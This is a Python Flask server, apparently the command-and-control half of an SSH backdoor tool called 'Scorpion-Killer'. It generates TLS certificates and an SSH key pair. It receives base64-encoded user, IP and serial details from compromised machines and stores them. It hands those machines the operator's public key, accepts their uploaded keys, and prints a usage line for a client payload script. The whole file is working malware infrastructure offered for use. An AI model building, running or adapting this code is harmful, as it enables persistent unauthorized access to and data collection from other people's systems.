import os
import json
import base64
from flask import Flask, request, Response
import subprocess
import argparse

BLACK   = "\033[30m"
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"
WHITE   = "\033[37m"
RESET = "\033[0m"


SKBD = f"""{RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⢉⠭⠀⠴⠘⠩⡢⠏⠘⡵⢒⠬⣍⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⣡⠔⠃⠀⠰⠀⠀⠀⠀⠈⠂⢀⠀⢋⠞⣬⢫⣦⣍⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢫⣼⠿⠁⠀⠀⠀⠐⠀⠀⠰⠀⠢⠈⠀⠠⠀⢚⡥⢏⣿⣿⣷⡵⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢓⣽⡓⡅⠀⠀⠀⠄⠀⠀⠄⠀⠁⠀⠀⠌⢀⠀⡸⣜⣻⣿⣿⣿⣿⣼⡀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⣤⣄⣠⠤⣄⠀⠀⠀⠀⠀⠀⠀⢀⣧⣿⡷⠹⠂⠀⠂⠀⢀⠠⠈⠀⠌⠀⠁⢈⠀⠄⢀⡷⣸⣿⣿⣿⣿⣿⣧⠃⠀⡴⢋⢠⣤⣦⣬⣕⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣔⣵⣿⣻⣯⣍⣉⠚⢕⢆⠀⠀⠀⠀⠀⢸⢾⣽⡷⡂⠀⠀⠄⠂⠀⡀⠄⠂⠀⠌⠀⡀⠀⢀⡾⣯⢿⣿⣿⣿⣿⣿⣿⠰⠸⠠⢠⣾⣿⣿⣷⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⣿⣿⠿⠿⢿⣿⣇⡛⡻⣧⠀⠀⠀⠀⢼⢸⡟⡧⣧⠀⠃⠀⡀⠄⠀⢀⠠⠘⠀⠠⠀⠀⡟⢧⣛⣿⣿⣿⣿⣿⣿⣧⠇⠀⡇⢻⣿⣿⣿⠟⠻⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠁⣠⣤⠀⠙⢿⣿⡤⢘⣆⠀⠀⠀⢹⣼⣿⡽⠖⠁⠀⢤⠀⠀⡐⠀⢀⠐⠈⠀⢠⠖⠙⠣⠟⣻⢿⣿⣟⣿⡿⠃⠀⠀⠃⢼⣿⣧⠀⠀⠀⠸⣿⣣⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣆⣿⡟⠀⠀⠀⣿⡇⠰⢸⠀⠀⠀⡸⡻⡕⠉⠀⠀⡐⠀⠈⠁⠀⠀⢠⠀⡴⠀⡠⠀⢀⠤⡲⠟⣉⠻⣿⣟⠁⠀⠀⠀⡅⢺⣿⣿⠃⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠛⠉⠀⠀⠀⣀⡿⣗⠧⣼⠀⠄⡎⣿⣇⣧⣀⠑⢆⠀⠀⠀⢹⢄⢀⢧⠊⢀⠊⠀⠘⡡⣪⡴⠛⢻⣷⣜⣿⣦⠀⠀⡀⡿⣸⣿⣿⡆⠀⠀⡠⢐⠫⠉⠩⠭⣗⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⢹⣷⣻⠇⣿⠘⡀⣿⣿⣿⣿⠛⠛⢦⣙⠄⠀⢈⣫⢼⠀⠤⠁⠀⣠⣾⣿⡇⠀⠐⠂⢻⣿⣟⣿⡇⢠⠃⣧⣿⣿⣾⠁⢀⢎⣴⡶⡿⢿⣟⣷⢮⡝⢿⣷⠤⡀⠀
⠀⠀⠀⠀⠀⠀⠈⣽⣯⢿⣣⡹⢰⠘⣿⡿⣹⣿⠀⠀⠹⣿⡿⣷⣬⣯⣾⣷⣤⣴⣾⡟⣍⡿⠃⠀⠀⠀⢸⣿⣿⣩⣒⣵⣷⣿⣿⡿⠃⠀⡞⢺⣿⣿⣯⢿⠉⠀⠉⠛⢦⣻⣇⠘⡆
⠀⠀⠀⠀⠀⠀⣀⣿⣾⡾⣿⣵⡢⠳⢿⣷⢹⣿⣆⠀⠀⠈⠉⢉⣽⢟⣿⠟⢻⢿⣷⣄⡁⠀⠀⠀⠀⣀⣾⡟⣍⣿⣿⣿⣿⣿⣿⡗⠀⠀⠇⣽⣿⣿⣿⡼⠀⠀⣠⡤⣀⠿⠏⣴⠇
⠀⠀⠀⠀⠀⠀⠸⡼⣿⣿⣽⣿⣿⣶⣬⣿⣯⢿⣷⣥⠶⣒⣶⣾⠏⠐⠙⠀⠈⠚⡌⢪⣿⣧⣖⠦⡭⠿⢛⣼⣿⣿⢿⣿⣿⡿⠝⠁⠀⠰⢀⣿⣿⣾⣿⡇⠀⠀⠻⢿⡝⠲⠛⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⡿⠻⢷⣮⣉⣭⣡⣟⡱⠀⠀⡀⢀⡞⢀⢠⡀⠹⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣟⠋⠀⠀⠀⡠⡡⣹⣿⣿⣿⠿⠡⢀⣀⠀⠾⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠽⢿⢿⣻⡿⠈⢀⣶⣿⣿⣿⣿⡽⠃⢀⡴⣰⣿⢤⣓⢿⣿⣄⠙⣻⣷⡟⣿⣿⣿⣽⡻⣿⠿⠧⡶⣒⢭⣺⣽⣿⠟⢍⢀⠀⡉⠑⢶⣯⡲⣄⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⣟⣷⣞⡟⠉⣴⡿⣯⣷⣿⣿⡟⡡⢀⣜⣼⣿⣿⣎⢳⢿⢻⣿⡄⠑⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣾⣿⣿⢃⣠⣤⢖⡾⢷⡲⣆⡳⣿⣮⢢⡄⠀⠀
⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣄⢈⢆⠻⢿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡧⢨⣲⣷⣿⠋⣟⣶⣀⣳⡖⣿⣇⣃⠀⠀
⠀⣘⡸⣞⣿⣿⣿⣿⣿⣿⣿⡿⠁⣺⣣⣿⣿⣿⣿⠎⢀⢢⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣢⢀⠡⡘⢪⡯⡻⣿⣿⣿⣿⣿⣿⣻⣟⢧⣽⣿⣿⠀⠀⣎⣱⡏⣏⣿⣯⡽⠀⠀
⠀⣿⣧⣼⣿⡟⠛⠛⠿⢟⠟⣁⣼⣿⣿⠛⢉⡜⠁⡠⣠⣷⢿⣿⡿⣿⣿⣿⣿⠟⠉⠙⠛⢯⣽⣯⠷⣄⠑⠜⠑⡷⡜⢿⠿⠟⠛⠉⠀⢸⢺⣾⣿⣿⣷⣄⣀⠏⣱⣿⣿⣿⠀⠀⠀
⠀⢹⣿⣾⣿⣿⣤⡤⠔⢑⣡⣾⡿⡿⠁⡠⠋⠀⡀⢀⣿⡟⣿⣿⣿⡙⣿⣻⣿⡄⠀⠀⠀⠀⠉⠻⣿⣟⣧⡄⠀⠘⣟⢦⡱⣄⠀⠀⠀⢸⣼⣿⢿⣿⣿⣷⣤⣾⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠹⢿⣿⠏⣰⣧⣾⣿⣿⠟⠋⠀⡰⠡⡡⠀⣠⣿⣿⣿⣿⣿⣿⣗⢸⣿⣿⣷⠀⠀⠀⠀⠀⠀⠱⡹⣟⣿⣦⡁⠈⠳⢕⢄⠑⠂⠐⢾⣿⣿⣿⣿⣿⠛⠿⠟⠛⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣯⣼⣿⣿⠋⠁⠀⠀⠀⠀⡇⠐⠀⢠⣿⣿⡝⣿⠃⠈⢻⡞⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠉⢻⣷⣾⣿⣦⡄⠀⠀⠈⠐⢺⣽⣿⣿⡎⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣻⡟⠁⠀⠀⠀⠀⠀⢸⡇⠀⢀⣿⣿⣿⣿⠏⠀⠀⢸⠳⣜⣹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⣿⣿⣷⣶⣶⣶⣿⣿⢟⣻⣿⢟⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⡦⠀⠀⠀⠀⠀⠘⡇⠰⣼⡿⡿⣾⡏⠀⠀⠀⢸⠣⣹⣾⣿⡹⠀⡠⢄⣂⢤⠀⠀⠀⠀⠀⠈⠉⠻⣟⢿⣾⣚⣿⣿⣿⣿⣽⡏⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⢛⣿⡟⠀⠀⠀⠀⠀⠀⢷⣀⢻⣷⣟⣻⡇⠀⠀⢀⢯⣅⣿⣷⣿⠇⣜⣾⣿⣿⣿⣧⣀⠀⠀⠀⠀⠀⠀⠈⠉⠸⠿⣿⠏⠘⠔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠈⢻⡯⢿⣿⡿⡴⣀⡠⣪⡷⣽⣿⣿⡿⢚⣿⣿⡟⠀⠙⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⡈⠛⠿⠽⢞⢋⠜⠻⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠛⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RESET}
Maptnh@S-H4CK13  SKBD(Scorpion-Killer)V1.0-Server  https://github.com/MartinxMax
"""

app = Flask(__name__)
ssl_dir = './skb_ssl'
auth_protect_dir = './auth_protect'
machines_dir = './machines'
app.config['ENV'] = 'production'
app.config['DEBUG'] = False

def base64_encode(plaintext):
    return base64.b64encode(plaintext.encode('utf-8')).decode('utf-8')


def base64_decode(encoded_data):
    try:
        return base64.b64decode(encoded_data).decode('utf-8')
    except Exception as e:
        return None

if not os.path.exists(ssl_dir):
    os.makedirs(ssl_dir)
    subprocess.run([
        'openssl', 'req', '-new', '-newkey', 'rsa:2048', '-days', '365', '-nodes', '-x509',
        '-keyout', f'{ssl_dir}/server.key', '-out', f'{ssl_dir}/server.crt',
        '-subj', '/C=US/ST=State/L=City/O=Organization/OU=OrgUnit/CN=MAPTNH.com'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if not os.path.exists(auth_protect_dir):
    os.makedirs(auth_protect_dir)

if not os.path.exists(f'{auth_protect_dir}/id_rsa') or not os.path.exists(f'{auth_protect_dir}/id_rsa.pub'):
    subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-f', f'{auth_protect_dir}/id_rsa', '-N', ''])
    subprocess.run(['chmod', '600', f'{auth_protect_dir}/id_rsa'])
    subprocess.run(['chmod', '644', f'{auth_protect_dir}/id_rsa.pub'])

@app.route('/skget', methods=['POST'])
def skget():
    try:
        data = request.data.decode('utf-8')
        decrypted_data = base64_decode(data)
        if decrypted_data:
            parsed_data = json.loads(decrypted_data)
            users = parsed_data.get('users')
            sn = parsed_data.get('sn')
            ips = parsed_data.get('ips')
            endpoint = parsed_data.get('endpoint')
            hostname = parsed_data.get('hostname')
            if users and sn and ips and endpoint:
 
                sn_directory = os.path.join(machines_dir, sn)
                if not os.path.exists(sn_directory):
                    print(f"[+] Creating directory for SN {sn}: {sn_directory}")
                    os.makedirs(sn_directory)
                else:
                    print(f"[*] Directory for SN {sn} already exists: {sn_directory}")
                with open(f"{sn_directory}/info.conf", "w", encoding="utf-8") as info:
                    info.write(f"[USERS]\nusers={users}\n[IPS]\nips={ips}\n[SN]\nsn={sn}\n")
                with open(f'{auth_protect_dir}/id_rsa.pub', 'r') as pub_key_file:
                    pub_key = pub_key_file.read()
                    encoded_pub_key = base64_encode(pub_key)
                payload = {'data':base64_encode(encoded_pub_key)}
                return Response(base64_encode(json.dumps(payload)), content_type='text/plain')
        print("[!] Invalid request or decryption failed.")
        return Response(base64_encode(json.dumps({'data': ''})), content_type='text/plain')
    except Exception as e:
        print(f"[!] Error: {e}")
        return Response(base64_encode(json.dumps({'data': ''})), content_type='text/plain')

@app.route('/skput', methods=['POST'])
def skput():
    try:
        data =  request.data.decode('utf-8')
        decrypted_data = base64_decode(data)
        if decrypted_data:
            parsed_data = json.loads(decrypted_data)
            users = parsed_data.get('users')
            sn = parsed_data.get('sn')
            hostname = parsed_data.get('hostname')
            ips = parsed_data.get('ips')
            endpoint = parsed_data.get('endpoint')
            key_data = parsed_data.get('data')
            if users and sn and ips and endpoint:
                print(f"[+] Valid request from {users} @ {ips} (SN: {sn})")
                pub_path = os.path.join(machines_dir, sn,'skbd.pub')
                decoded_key = base64.b64decode(key_data)
                with open(pub_path, 'wb') as pub_key_file:
                    pub_key_file.write(decoded_key)
                os.chmod(pub_path, 0o600)
                print(f"[+] Stored SSH Key for {sn}")
                return Response(base64_encode(json.dumps({'data': 'SUCCESS'})), content_type='text/plain')
 
        print("[!] Invalid request or decryption failed.")
        return Response(base64_encode(json.dumps({'data': ''})), content_type='text/plain')

    except Exception as e:
        print(f"[!] Error: {e}")
        return Response(base64_encode(json.dumps({'data': ''})), content_type='text/plain')


if __name__ == '__main__':
    print(SKBD)
    parser = argparse.ArgumentParser(description='Scorpion-Killer')
    parser.add_argument('--lport', type=int, default=9191, help='Local port to listen on')
    args = parser.parse_args()
    print(f"[PAYLOAD] ./skbd.sh -e '<HTTPS>://<IP>/<PORT>'")
    app.run(host='0.0.0.0', port=args.lport, ssl_context=(f'{ssl_dir}/server.crt', f'{ssl_dir}/server.key'))
